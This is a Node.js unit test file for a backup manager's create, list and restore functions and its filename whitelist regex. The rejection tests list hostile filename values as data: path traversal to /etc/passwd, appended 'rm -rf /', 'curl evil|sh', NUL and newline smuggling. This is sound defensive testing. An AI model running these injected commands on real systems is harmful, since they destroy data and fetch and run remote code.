/**
 * Unit tests — Backup Manager (src/server.mjs)
 * TASK-002 / framework: node:test (ADR-001)
 *
 * 隔離策略：
 *  - 每個 test 在 mkdtempSync 的 temp dir 裡模擬 PAAW_ROOT（data/ .paaw/）與 BACKUP_DIR
 *  - PAAW_ROOT / PAAW_BACKUP_DIR / PAAW_EVENT_LOG 在 import 時讀取，
 *    因此每個 test 用 unique query string 重新 dynamic import（cache-bust）
 *  - server.mjs 有 main guard，import 不會 listen :4199、不會 spawn PAAW
 */
import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import {
  mkdtempSync, rmSync, mkdirSync, writeFileSync,
  readdirSync, existsSync, readFileSync, utimesSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFileSync } from "node:child_process";

let server;      // module under test（每個 test 重新 import）
let tmp;         // temp root（afterEach 整個刪掉）
let paawRoot;    // 模擬的 PAAW 資料根目錄（data/ .paaw/）
let backupDir;
let importSeq = 0;

async function loadServer(extraEnv = {}) {
  process.env.PAAW_ROOT = paawRoot;
  process.env.PAAW_BACKUP_DIR = backupDir;
  process.env.PAAW_EVENT_LOG = join(tmp, "events.jsonl");
  for (const [k, v] of Object.entries(extraEnv)) process.env[k] = v;
  importSeq += 1;
  // unique query → 繞過 ESM cache，確保本輪的 env 生效
  server = await import(`../../src/server.mjs?case=${importSeq}`);
  return server;
}

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "paaw-backup-test-"));
  paawRoot = join(tmp, "paaw-root");
  backupDir = join(tmp, "backups");
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

/** 在 paawRoot 建立可備份的資料（data/ + .paaw/） */
function makePaawData(dbContent = "db-v1") {
  mkdirSync(join(paawRoot, "data"), { recursive: true });
  mkdirSync(join(paawRoot, ".paaw"), { recursive: true });
  writeFileSync(join(paawRoot, "data", "db.json"), dbContent);
  writeFileSync(join(paawRoot, ".paaw", "state.json"), '{"v":1}');
}

/** 在 backupDir 放一個「檔名合法」的假備份（內容不需要是真的 tar，listBackups 只 stat） */
function seedNamedBackup(filename, mtime) {
  mkdirSync(backupDir, { recursive: true });
  const p = join(backupDir, filename);
  writeFileSync(p, "fake-tar-gz-bytes");
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

/** 用真 tar 打包 paawRoot 現有內容 → 產生「內容有效」的備份檔（restore 測試用） */
function makeRealBackupArchive(filename) {
  mkdirSync(backupDir, { recursive: true });
  execFileSync("tar", ["czf", join(backupDir, filename), "data", ".paaw"], {
    cwd: paawRoot, encoding: "utf-8",
  });
}

// ─────────────────────────────────────────────────────────────
// 1. BACKUP_REGEX 白名單
// ─────────────────────────────────────────────────────────────

test("BACKUP_REGEX accepts the legal paaw-backup-YYYY-MM-DD-HH.tar.gz format", async () => {
  const { BACKUP_REGEX } = await loadServer();
  assert.equal(BACKUP_REGEX.test("paaw-backup-2026-08-25-14.tar.gz"), true, "spec 範例檔名");
  assert.equal(BACKUP_REGEX.test("paaw-backup-2099-12-31-23.tar.gz"), true, "邊界日期");
  assert.equal(BACKUP_REGEX.test("paaw-backup-0000-01-01-00.tar.gz"), true, "邊界全零");
});

test("BACKUP_REGEX rejects path traversal, wrong date format, and injection names", async () => {
  const { BACKUP_REGEX } = await loadServer();
  const rejects = [
    "../etc/passwd",                              // path traversal
    "..\\..\\x",                                  // windows traversal
    "paaw-backup-20260825-14.tar.gz",             // ★ QA 抓到的舊錯誤格式（YYYYMMDD）
    "paaw-backup-.tar.gz",                        // 日期整段缺失
    "paaw-backup-2026-08-25.tar.gz",              // 少 -HH
    "paaw-backup-2026-08-25-14.tar.gz.exe",       // 雙副檔名
    "paaw-backup-2026-08-25-14.tar.gz;rm -rf /",  // shell 注入 ;
    "paaw-backup-2026-08-25-14.tar.gz && curl evil|sh", // shell 注入 &&
    "paaw-backup-2026-08-25-14.tar.gz\x00",       // NUL byte
    "paaw-backup-2026-08-25-14.tar.gz\n",         // 換行 smuggling
  ];
  for (const name of rejects) {
    assert.equal(BACKUP_REGEX.test(name), false, `must reject: ${JSON.stringify(name)}`);
  }
});

// ─────────────────────────────────────────────────────────────
// 2. ★ Regression invariant（TASK-001 critical bug 根因）
// ─────────────────────────────────────────────────────────────

test("★ invariant: filename produced by createBackup must pass BACKUP_REGEX", async () => {
  makePaawData();
  const { createBackup, BACKUP_REGEX, BACKUP_DATE_REGEX } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, true, `createBackup 應成功: ${JSON.stringify(result)}`);
  assert.ok(typeof result.filename === "string", "必須回傳 filename");
  // ↓ 這行就是上次 critical bug 的防火牆：產生端與驗證端格式必須一致
  assert.equal(
    BACKUP_REGEX.test(result.filename), true,
    `createBackup 產生的 "${result.filename}" 必須通過 BACKUP_REGEX`,
  );
  assert.match(result.filename, BACKUP_DATE_REGEX, "也必須能被 BACKUP_DATE_REGEX 解析出日期");
  assert.ok(result.size > 0, "size 應 > 0");
});

// ─────────────────────────────────────────────────────────────
// 3. listBackups
// ─────────────────────────────────────────────────────────────

test("listBackups returns only whitelisted backups, ignoring .DS_Store and invalid names", async () => {
  seedNamedBackup("paaw-backup-2026-01-10-08.tar.gz");
  seedNamedBackup("paaw-backup-2026-01-11-09.tar.gz");
  seedNamedBackup(".DS_Store");
  seedNamedBackup("paaw-backup-20260110-08.tar.gz");   // QA 抓到的錯誤格式
  seedNamedBackup("paaw-backup-.tar.gz");
  seedNamedBackup("notes.txt");
  seedNamedBackup("paaw-backup-2026-01-12-10.tar.gz.exe");

  const { listBackups, BACKUP_REGEX } = await loadServer();
  const backups = listBackups();

  assert.equal(backups.length, 2, `應只剩 2 個合法備份，實得: ${backups.map(b => b.filename)}`);
  for (const b of backups) {
    assert.equal(BACKUP_REGEX.test(b.filename), true);
    assert.ok(typeof b.size === "number" && b.size > 0);
    assert.ok(typeof b.created === "string");
  }
  assert.deepEqual(
    backups.map(b => b.filename).sort(),
    ["paaw-backup-2026-01-10-08.tar.gz", "paaw-backup-2026-01-11-09.tar.gz"].sort(),
  );
  // date 欄位解析自檔名
  assert.equal(backups.find(b => b.filename === "paaw-backup-2026-01-10-08.tar.gz").date, "2026-01-10-08");
});

test("listBackups sorts newest-first by mtime", async () => {
  seedNamedBackup("paaw-backup-2026-01-01-01.tar.gz", new Date("2026-01-01T01:00:00Z"));
  seedNamedBackup("paaw-backup-2026-02-02-02.tar.gz", new Date("2026-02-02T02:00:00Z"));
  seedNamedBackup("paaw-backup-2026-03-03-03.tar.gz", new Date("2026-03-03T03:00:00Z"));

  const { listBackups } = await loadServer();
  assert.deepEqual(
    listBackups().map(b => b.filename),
    [
      "paaw-backup-2026-03-03-03.tar.gz",
      "paaw-backup-2026-02-02-02.tar.gz",
      "paaw-backup-2026-01-01-01.tar.gz",
    ],
  );
});

test("listBackups returns [] when backup dir does not exist", async () => {
  const { listBackups } = await loadServer();
  assert.deepEqual(listBackups(), []);
});

// ─────────────────────────────────────────────────────────────
// 4. createBackup
// ─────────────────────────────────────────────────────────────

test("createBackup produces a real, extractable tar.gz in BACKUP_DIR", async () => {
  makePaawData("hello-backup");
  const { createBackup } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, true, JSON.stringify(result));
  const filepath = join(backupDir, result.filename);
  assert.ok(existsSync(filepath), `備份檔必須真的存在: ${filepath}`);

  // 用 tar -tzf 驗證是真 tar.gz 且包含 data/（不是空殼檔案）
  const entries = execFileSync("tar", ["-tzf", filepath], { encoding: "utf-8" });
  assert.match(entries, /(^|\/)data\//, `tar 內容應含 data/: ${entries}`);
});

test("createBackup returns { ok:false } when PAAW_ROOT has nothing to back up", async () => {
  // paawRoot 存在但沒有 data/ 也沒有 .paaw/ → tar 無成員 → 失敗路徑
  mkdirSync(paawRoot, { recursive: true });
  const { createBackup } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, false, "無可備份內容時應回報失敗而非 throw");
  assert.ok(typeof result.error === "string" && result.error.length > 0);
});

test("createBackup prunes oldest backups beyond PAAW_MAX_BACKUPS (retention)", async () => {
  makePaawData();
  // 預先放 4 個合法舊備份（mtime 由舊到新）
  seedNamedBackup("paaw-backup-2026-01-01-01.tar.gz", new Date("2026-01-01T01:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-02-02.tar.gz", new Date("2026-01-02T02:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-03-03.tar.gz", new Date("2026-01-03T03:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-04-04.tar.gz", new Date("2026-01-04T04:00:00Z"));

  const { createBackup, listBackups } = await loadServer({ PAAW_MAX_BACKUPS: "3" });
  const result = createBackup("unit-test");
  assert.equal(result.ok, true, JSON.stringify(result));

  const remaining = listBackups();
  assert.equal(remaining.length, 3, "retention 上限 3：新增後應只保留 3 個");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-01-01.tar.gz")), false, "最舊的應被刪除");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-02-02.tar.gz")), false, "次舊的應被刪除");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-04-04.tar.gz")), true);
});

// ─────────────────────────────────────────────────────────────
// 5. restoreBackup
// ─────────────────────────────────────────────────────────────

test("restoreBackup rejects path-traversal and injection filenames without touching disk", async () => {
  makePaawData();
  const { restoreBackup } = await loadServer();
  const attacks = [
    "../../etc/passwd",
    "..\\..\\x",
    "paaw-backup-20260825-14.tar.gz",
    "paaw-backup-.tar.gz",
    "paaw-backup-2026-08-25-14.tar.gz;rm -rf /",
  ];
  for (const name of attacks) {
    const r = restoreBackup(name);
    assert.equal(r.ok, false, `應拒絕: ${name}`);
    assert.match(r.error, /invalid/i, `錯誤訊息應標明 invalid: ${r.error}`);
  }
  assert.equal(existsSync(backupDir), false, "被拒絕時連 BACKUP_DIR 都不應被建立");
});

test("restoreBackup returns { ok:false, 'not found' } for a valid-format but missing file", async () => {
  mkdirSync(backupDir, { recursive: true });
  const { restoreBackup } = await loadServer();
  const r = restoreBackup("paaw-backup-2020-01-01-01.tar.gz");
  assert.equal(r.ok, false);
  assert.match(r.error, /not found/i);
});

test("restoreBackup restores data/ and .paaw/ and creates a pre-restore safety backup", async () => {
  // Arrange：打包「舊內容」成過去日期的合法備份（刻意用過去日期，避開 safety backup 同小時撞名）
  makePaawData("old-content-v1");
  mkdirSync(backupDir, { recursive: true });
  const restoreTarget = "paaw-backup-2026-01-15-08.tar.gz";
  makeRealBackupArchive(restoreTarget);

  // 備份後，線上資料被改壞
  writeFileSync(join(paawRoot, "data", "db.json"), "changed-after-backup");
  const { restoreBackup, listBackups } = await loadServer();

  assert.equal(listBackups().length, 1, "restore 前應只有 1 個備份");

  // Act
  const r = restoreBackup(restoreTarget);

  // Assert：資料回滚 + safety backup 出現
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(readFileSync(join(paawRoot, "data", "db.json"), "utf-8"), "old-content-v1");
  assert.equal(readFileSync(join(paawRoot, ".paaw", "state.json"), "utf-8"), '{"v":1}');

  const after = listBackups();
  assert.equal(after.length, 2, `還原前應自動產生 safety backup（1→2）: ${after.map(b => b.filename)}`);
  assert.ok(
    after.some(b => b.filename === restoreTarget),
    "原備份檔應 still 存在",
  );
  assert.ok(
    after.some(b => b.filename !== restoreTarget),
    "應多出一個新的 safety backup",
  );
});

test("restoreBackup returns { ok:false } when the archive is corrupt", async () => {
  makePaawData(); // 讓 safety createBackup 有東西可包
  seedNamedBackup("paaw-backup-2026-02-02-02.tar.gz"); // 內容是假 bytes，非真 tar
  const { restoreBackup } = await loadServer();
  const r = restoreBackup("paaw-backup-2026-02-02-02.tar.gz");

  assert.equal(r.ok, false, "解不開的檔案應回報失敗而非 throw");
  assert.ok(typeof r.error === "string" && r.error.length > 0);
});
